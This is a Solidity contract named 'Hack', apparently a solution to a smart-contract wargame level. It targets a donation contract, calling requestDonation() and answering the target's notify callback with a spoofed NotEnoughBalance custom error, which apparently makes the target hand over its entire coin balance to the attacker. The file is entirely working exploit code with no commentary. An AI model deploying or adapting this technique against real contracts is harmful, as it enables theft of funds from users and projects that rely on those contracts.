// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGood {
    function coin() external view returns (address);
  
    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns(uint256);
    
}


contract Hack {
    IGood public   target;
    ICoin public   coin;


    error NotEnoughBalance();

    constructor(IGood _target){
        target = _target;
        coin = ICoin(_target.coin());
    }

    function hack() external {
        target.requestDonation();
        require(coin.balances(address(this)) == 10 **6);
    }

    function notify(uint amount) external{
        if(amount == 10){
            revert NotEnoughBalance();
        }
    }
}